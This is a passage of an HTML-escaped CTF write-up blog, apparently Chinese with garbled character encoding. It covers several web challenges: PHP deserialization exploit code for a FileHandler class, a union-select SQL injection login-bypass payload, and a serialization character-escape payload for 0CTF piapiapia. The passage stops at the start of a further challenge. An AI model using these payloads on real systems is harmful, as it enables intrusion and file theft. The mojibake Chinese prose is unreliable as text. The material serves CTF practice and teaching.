&lt;p&gt;read () å¯ä»¥è¯»æ–‡ä»¶ =&amp;gt;read () ä¼šè¢« process () è°ƒç”¨ =&amp;gt;process () ä¼šè¢« &lt;code&gt;__construct()&lt;/code&gt;  è¿˜æœ‰ &lt;code&gt;__destruct()&lt;/code&gt;  è°ƒç”¨&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç”±äº &lt;code&gt;__construct()&lt;/code&gt;  ä¼šåˆå§‹åŒ–å¯¼è‡´æ–‡ä»¶åä¸å¯æ§ï¼Œä¸”å…¶å¯ä»¥ç»•è¿‡ï¼Œè€Œ &lt;code&gt;__destruct()&lt;/code&gt; , ä¼šè®© op å¼ºåˆ¶ç­‰äº 1ï¼Œä½†æ˜¯è¿™é‡Œç”¨äº† &lt;code&gt;===â€˜2â€™&lt;/code&gt; ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœ op ä¸ºæ•´å‹ 2ï¼Œå³å¯ç»•è¿‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åŒæ—¶è¿™é¢˜æœ‰ä¸€ä¸ª checkï¼Œæˆ‘ä»¬æŠŠ protected æ”¹æˆ public å³å¯ç»•è¿‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FileHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/tmp/tmpfile&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello World!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;process&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write();&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Bad Hacker!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(strlen((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content) &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Too long!&amp;quot;&lt;/span&gt;);&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;();&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_put_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Successful!&amp;quot;&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;output&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op === &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; FileHandler;&lt;br&gt;var_dump(urlencode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;)));&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gxyctf2019babysqli&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019babysqli&#34;&gt;#&lt;/a&gt; [GXYCTF2019]BabySQli&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;æµ‹è¯•å•å¼•å·ä¼šæŠ¥é”™&lt;/li&gt;
&lt;li&gt;union select å­—æ®µæ•°ä¸º 3ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ç‚¹ï¼Œå¯èƒ½æ˜¯ç›²æ³¨æˆ–è€…æŠ¥é”™æ³¨å…¥&lt;/li&gt;
&lt;li&gt;user ä¸º admin æ—¶æŠ¥ wrong passï¼Œuser ä¸ºå…¶å®ƒæ—¶æŠ¥ wrong userï¼Œè¿™é‡Œå¯èƒ½æ˜¯ç›²æ³¨ç‚¹&lt;/li&gt;
&lt;li&gt;æœ‰ä¸€æ®µç¼–ç ï¼Œbase32+base64 è§£ç å¾—åˆ°ï¼š &lt;code&gt;select * from user where username = &#39;$name&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;é¢˜ç›®è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼š &lt;code&gt;(    )   or    =&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è¦é€šè¿‡æ³¨å…¥æ‹¿åˆ°æ•°æ®åŸºæœ¬æ˜¯ä¸å¯è¡Œçš„ï¼Œè¿™é‡Œçœ‹åˆ° sql è¯­å¥ä¸­åªæœ‰æŸ¥è¯¢ name å€¼ï¼Œæ²¡æœ‰çœ‹åˆ° passwordï¼Œå¯èƒ½åˆ¤æ–­æ˜¯å¦ç™»å…¥çš„è¯­å¥æ˜¯ &lt;code&gt;(select * from user where username = &#39;$name&#39;)[&#39;password&#39;] =md5(password) &lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ­¤æ—¶æ„é€  payload: &lt;code&gt;name=-1&#39; union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;amp;pw=123456&lt;/code&gt;  å³å¯ç™»é™†æˆåŠŸæ‹¿åˆ° flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0ctf-2016piapiapia&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0ctf-2016piapiapia&#34;&gt;#&lt;/a&gt; [0CTF 2016]piapiapia&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;/www.zip æ‹¿åˆ°æºç &lt;/li&gt;
&lt;li&gt;çœ‹æºç åº”è¯¥æ˜¯ååºåˆ—åŒ–çš„é¢˜ç›®ï¼ŒåŒæ—¶çœ‹åˆ° &lt;code&gt;return preg_replace($safe, &#39;hacker&#39;, $string);&lt;/code&gt; ï¼Œåº”è¯¥æ˜¯å­—ç¬¦é€ƒé€¸ååºåˆ—åŒ–çš„é¢˜ç›®ã€‚åŒæ—¶ flag åº”è¯¥åœ¨ config.php ä¸­&lt;/li&gt;
&lt;li&gt;å…ˆæ„é€  POP é“¾&lt;/li&gt;
&lt;li&gt;profile.php å¯ä»¥è¯»æ–‡ä»¶ï¼Œè¦å®ç°ä»»æ„æ–‡ä»¶è¯»å–å°±è¦è¦†ç›–&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;â€²&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;â€²&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mtext&gt;ï¼Œè€Œ&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;profile[&amp;#x27;photo&amp;#x27;]ï¼Œè€Œ&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;â€²&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;â€²&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ï¼Œ&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è€Œ&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; profile [â€˜photoâ€™] åœ¨ update.php ä¸­æ§åˆ¶ã€‚æ¥ä¸‹æ¥å°±æ˜¯è¦å¦‚ä½•æŠŠ $profile [â€˜photoâ€™] å˜æˆ config.php&lt;/li&gt;
&lt;li&gt;update.php å¯ä¼ å…¥å››ä¸ªå‚æ•°ï¼Œå…¶ä¸­ phone å’Œ email è¢«æ­£åˆ™åŒ¹é…é™åˆ¶ï¼Œè€Œ nickname æ˜¯ç”¨ strlen é™åˆ¶åœ¨ 10 ä»¥å†…ï¼ŒæŠŠ nickname æ”¹æˆæ•°ç»„ä¹Ÿå°±ç»•è¿‡äº†é•¿åº¦é™åˆ¶&lt;/li&gt;
&lt;li&gt;æˆ‘ä»¬éœ€è¦æ„é€  &lt;code&gt;a:4:&amp;#123;s:5:&amp;quot;phone&amp;quot;;s:11:&amp;quot;12345678901&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:10:&amp;quot;123@qq.com&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:9:&amp;quot;lalalalla&amp;quot;;s:5:&amp;quot;photo&amp;quot;;s:10:&amp;quot;config.php&amp;quot;;&amp;#125;&lt;/code&gt; ï¼Œåˆ©ç”¨ where ä¼šè¢«æ›¿æ¢æˆ hackerï¼Œæ„é€  payloadï¼š &lt;code&gt;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&amp;quot;;&amp;#125;s:5:&amp;quot;photo&amp;quot;;s:10:&amp;quot;config.php&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è¦æ³¨æ„è¿™è¾¹æ„é€ æ—¶ï¼Œéœ€è¦æŠŠ nickname æ„é€ æˆæ•°ç»„&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gxyctf2019ç¦æ­¢å¥—å¨ƒ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019ç¦æ­¢å¥—å¨ƒ&#34;&gt;#&lt;/a&gt; [GXYCTF2019] ç¦æ­¢å¥—å¨ƒ&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æµ‹è¯•å‘ç°æœ‰ /.git/ ç”¨ githack è·‘ä¸€ä¸‹ï¼Œä½†æ˜¯æˆ‘æ²¡æ‹¿åˆ°æºç ï¼Ÿï¼Ÿ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç½‘ä¸Šæ‰¾åˆ°æºç ï¼š&lt;/p&gt;
